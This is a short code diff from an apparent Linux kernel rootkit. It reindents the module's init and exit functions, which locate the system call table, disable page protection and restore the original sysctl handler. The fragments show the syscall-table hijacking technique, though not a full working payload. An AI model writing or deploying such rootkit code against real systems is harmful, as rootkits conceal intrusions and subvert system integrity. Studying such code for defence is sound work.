@@ -88,8 +88,8 @@ static void enable_page_protection(void) {
 
 int rootkit_init(void){
 
-  if(!(sys_call_table = find_sys_call_table())){
-    return -1;
+	if(!(sys_call_table = find_sys_call_table())){
+		return -1;
 	}
 
 	disable_page_protection();
@@ -101,9 +101,9 @@ int rootkit_init(void){
 
 void rootkit_exit(void){
 
-  if(sys_call_table==NULL) {
-    return;
-  }
+	if(sys_call_table==NULL) {
+		return;
+	}
 
 	disable_page_protection();
 	sys_call_table[__NR_sysctl] = (unsigned long *)original_sys_sysctl;
